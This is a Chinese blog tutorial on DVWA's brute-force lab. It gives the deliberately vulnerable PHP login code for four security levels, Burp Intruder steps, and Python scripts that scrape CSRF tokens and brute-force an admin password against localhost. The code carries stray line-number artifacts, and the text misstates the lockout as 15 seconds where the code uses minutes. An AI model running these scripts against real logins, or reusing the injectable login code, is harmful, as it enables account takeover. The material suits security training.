**目录**

[Low](#t0)

[Medium](#t1)

[High](#t2)

[Impossible](#t3)

* * *

暴力破解是指使用穷举法，举出所有的可能的结果，然后逐一验证是否正确！

Low
---

源代码：

```
<?php      
if( isset( $_GET[ 'Login' ] ) ) {      
    // Get username      
    $user = $_GET[ 'username' ];      
    // Get password      
    $pass = $_GET[ 'password' ];      
    $pass = md5( $pass );      
    // Check the database      
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";      1
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );      1
    if( $result && mysqli_num_rows( $result ) == 1 ) {      1
        // Get users details      1
        $row    = mysqli_fetch_assoc( $result );      1
        $avatar = $row["avatar"];      1
        // Login successful      1
        echo "<p>Welcome to the password protected area {$user}</p>";      1
        echo "<img src=\"{$avatar}\" />";      1
    }      1
    else {      2
        // Login failed      2
        echo "<pre><br />Username and/or password incorrect.</pre>";      2
    }      2
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);      2
}      2
?>
```


low级别的代码直接获取用户输入的用户名和密码，密码再经过MD5进行加密，所以杜绝了通过密码进行SQL注入的可能。然后查询数据库中，查询出结果来了说明用户名和密码正确。这里对输入的用户名和密码没经过任何的过滤和检查。

我们输入 admin 和任意的密码，然后用burpsuite进行抓包

![](https://img-blog.csdn.net/20181004164457546?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

发送到 Intruder 模块 ，这里会对所有可能的爆破点标记

![](https://img-blog.csdn.net/20181004164719458?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们点击 clear，然后add增加我们的密码，使其成为爆破点

![](https://img-blog.csdn.net/20181004164752594?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们点击 payloads，然后选择 load 来加载我们的密码字典，也可以使用paste粘贴密码，还可以使用add手动输入密码

![](https://img-blog.csdn.net/20181004164826608?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

然后点击 start attack 开始攻击

![](https://img-blog.csdn.net/20181004165429704?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70) 

从弹出的页面可以看到，第二条的长度和其他的不一样，可以判断这个就是正确的密码了

![](https://img-blog.csdn.net/20181004165523562?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

Medium
------

源代码： 

```
<?php      
if( isset( $_GET[ 'Login' ] ) ) {      
    // Sanitise username input      
    $user = $_GET[ 'username' ];      
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      
    // Sanitise password input      
    $pass = $_GET[ 'password' ];      
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      
    $pass = md5( $pass );      1
    // Check the database      1
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";      1
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );      1
    if( $result && mysqli_num_rows( $result ) == 1 ) {      1
        // Get users details      1
        $row    = mysqli_fetch_assoc( $result );      1
        $avatar = $row["avatar"];      1
        // Login successful      1
        echo "<p>Welcome to the password protected area {$user}</p>";      1
        echo "<img src=\"{$avatar}\" />";      2
    }      2
    else {      2
        // Login failed      2
        sleep( 2 );      2
        echo "<pre><br />Username and/or password incorrect.</pre>";      2
    }      2
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);      2
}      2
?>
```


mysqli\_real\_escape\_string(string,connection) ：函数会对字符串string中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义，基本可以抵抗SQL注入

$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS\[index\] 的数组中存储了所有全局变量。变量的名字就是数组的键。 

可以看到，medium级别的代码对用户输入的参数进行了简单的过滤，对一些预定义字符进行了转义，基本上防止了SQL注入。还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交。

这依然可以和 low 级别的爆破一样，只不过时间长了点而已。因为试一次密码要过滤2秒才能试下一个。

High
----

源代码：

```
<?php      
if( isset( $_GET[ 'Login' ] ) ) {      
    // Check Anti-CSRF token      
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );      
    // Sanitise username input      
    $user = $_GET[ 'username' ];      
    $user = stripslashes( $user );      
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      
    // Sanitise password input      1
    $pass = $_GET[ 'password' ];      1
    $pass = stripslashes( $pass );      1
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      1
    $pass = md5( $pass );      1
    // Check database      1
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";      1
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );      1
    if( $result && mysqli_num_rows( $result ) == 1 ) {      1
        // Get users details      1
        $row    = mysqli_fetch_assoc( $result );      2
        $avatar = $row["avatar"];      2
        // Login successful      2
        echo "<p>Welcome to the password protected area {$user}</p>";      2
        echo "<img src=\"{$avatar}\" />";      2
    }      2
    else {      2
        // Login failed      2
        sleep( rand( 0, 3 ) );      2
        echo "<pre><br />Username and/or password incorrect.</pre>";      2
    }      3
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);      3
}      3
// Generate Anti-CSRF token      3
generateSessionToken();      3
?>
```


stripslashes(string)： 去除掉string字符的反斜杠＼

mysqli\_real\_escape\_string(string,connection) ：函数会对字符串string中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义。

$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS\[index\] 的数组中存储了所有全局变量。变量的名字就是数组的键。

High级别的代码使用了Anti-CSRF token来抵御CSRF的攻击，使用了stripslashes函数和mysqli\_real\_esacpe\_string来抵御SQL注入和XSS的攻击。

由于使用了Anti-CSRF token，每次服务器返回的登陆页面中都会包含一个随机的user\_token的值，用户每次登录时都要将user\_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，我们不能再利用burpsuite进行无脑式的爆破了。

于是乎我写了两个python脚本来进行爆破，一个是基于python2.x的，一个是基于python3.x的，效果都一样，在这里我给大家把源代码都给贴出来了。

我先模拟我们的浏览器向服务器发送请求，然后获得token，然后再利用获得的token进行爆破。每爆破一次，获得的token都是不一样的，在这里我只模拟了20次爆破

Python2.x代码

```
from bs4 import BeautifulSoup      
import urllib2      
header={'Host':'127.0.0.1',      
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',      
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',      
        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',      
        'Referer':'http://127.0.0.1/vulnerabilities/brute/',      
        'cookie':'PHPSESSID=6oqhn9tsrs80rbf3h4cvjutnn6; security=high',      
        'Connection':'close',      1
        'Upgrade-Insecure-Requests':'1'      1
        }      1
requrl="http://127.0.0.1/vulnerabilities/brute/"       1
def get_token(requrl,header):      1
    req=urllib2.Request(url=requrl,headers=header)      1
    response=urllib2.urlopen(req)      1
    print response.getcode(),      1
    the_page=response.read()      1
    print len(the_page)      2
    soup=BeautifulSoup(the_page,"html.parser")   #将返回的html页面解析为一个BeautifulSoup对象      2
    input=soup.form.select("input[type='hidden']")   #返回的是一个list列表      2
    user_token=input[0]['value']               #获取用户的token      2
    return user_token       2
user_token=get_token(requrl,header)      2
i=0      2
for line in open("E:\Password\mima.txt"):      2
    requrl="http://127.0.0.1/vulnerabilities/brute/?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token      2
    i=i+1      3
    print i , 'admin' ,line.strip(),      3
    user_token=get_token(requrl,header)      3
    if(i==20):      3
        break
```


python3.x代码 

```
from bs4 import BeautifulSoup      
import requests       
header={'Host':'127.0.0.1',      
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',      
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',      
        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',      
        'Referer':'http://127.0.0.1/vulnerabilities/brute/',      
        'cookie':'PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high',      1
        'Connection':'close',      1
        'Upgrade-Insecure-Requests':'1'      1
        }      1
requrl="http://127.0.0.1/vulnerabilities/brute/"       1
def get_token(requrl,header):      1
    response=requests.get(url=requrl,headers=header)      1
    print (response.status_code,len(response.content))      1
    soup=BeautifulSoup(response.text,"html.parser")      1
    input=soup.form.select("input[type='hidden']")   #返回的是一个list列表      2
    user_token=input[0]['value']                   #获取用户的token      2
    return user_token       2
user_token=get_token(requrl,header)      2
i=0      2
for line in open("E:\Password\mima.txt"):      2
    requrl="http://127.0.0.1/vulnerabilities/brute/?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token      2
    i=i+1      2
    print (i , 'admin' ,line.strip(),end="  ")      2
    user_token=get_token(requrl,header)      3
    if(i==20):      3
        break
```


运行脚本，可以看到，当密码是password时，返回的长度是5300，其余的返回长度都是5262，可猜想密码 password 是正确的密码。手工验证得证！

![](https://img-blog.csdn.net/20181006144112150?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

或者我们可以通过设置代理，然后Fidder抓包也可以很直观的看到返回的长度。

![](https://img-blog.csdn.net/20181006152451423?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

Impossible
----------

源代码：

```
<?php      
if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {      
    // Check Anti-CSRF token      
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );      
    // Sanitise username input      
    $user = $_POST[ 'username' ];      
    $user = stripslashes( $user );      
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      
    // Sanitise password input      1
    $pass = $_POST[ 'password' ];      1
    $pass = stripslashes( $pass );      1
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      1
    $pass = md5( $pass );      1
    // Default values      1
    $total_failed_login = 3;      1
    $lockout_time       = 15;      1
    $account_locked     = false;       1
    // Check the database (Check user information)      2
    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );      2
    $data->bindParam( ':user', $user, PDO::PARAM_STR );      2
    $data->execute();      2
    $row = $data->fetch();      2
    // Check to see if the user has been locked out.      2
    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {      2
        // User locked out.  Note, using this method would allow for user enumeration!      2
        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";      2
        // Calculate when the user would be allowed to login again      2
        $last_login = strtotime( $row[ 'last_login' ] );      3
        $timeout    = $last_login + ($lockout_time * 60);      3
        $timenow    = time();      3
        /*      3
        print "The last login was: " . date ("h:i:s", $last_login) . "<br />";      3
        print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";      3
        print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";      3
        */      3
        // Check to see if enough time has passed, if it hasn't locked the account      3
        if( $timenow < $timeout ) {      3
            $account_locked = true;      4
            // print "The account is locked<br />";      4
        }      4
    }      4
    // Check the database (if username matches the password)      4
    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );      4
    $data->bindParam( ':user', $user, PDO::PARAM_STR);      4
    $data->bindParam( ':password', $pass, PDO::PARAM_STR );      4
    $data->execute();      4
    $row = $data->fetch();      4
    // If its a valid login...      5
    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {      5
        // Get users details      5
        $avatar       = $row[ 'avatar' ];      5
        $failed_login = $row[ 'failed_login' ];      5
        $last_login   = $row[ 'last_login' ];      5
        // Login successful      5
        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";      5
        echo "<img src=\"{$avatar}\" />";      5
        // Had the account been locked out since last login?      5
        if( $failed_login >= $total_failed_login ) {      6
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";      6
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";      6
        }      6
        // Reset bad login count      6
        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );      6
        $data->bindParam( ':user', $user, PDO::PARAM_STR );      6
        $data->execute();      6
    } else {      6
        // Login failed      6
        sleep( rand( 2, 4 ) );      7
        // Give the user some feedback      7
        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";      7
        // Update bad login count      7
        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );      7
        $data->bindParam( ':user', $user, PDO::PARAM_STR );      7
        $data->execute();      7
    }      7
    // Set the last login time      7
    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );      7
    $data->bindParam( ':user', $user, PDO::PARAM_STR );      8
    $data->execute();      8
}      8
// Generate Anti-CSRF token      8
generateSessionToken();      8
?>
```


可以看到，impossible级别在 high 的基础上对用户的登录次数有所限制，当用户登录失败达到3次，将会锁住账号15秒，同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这里因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。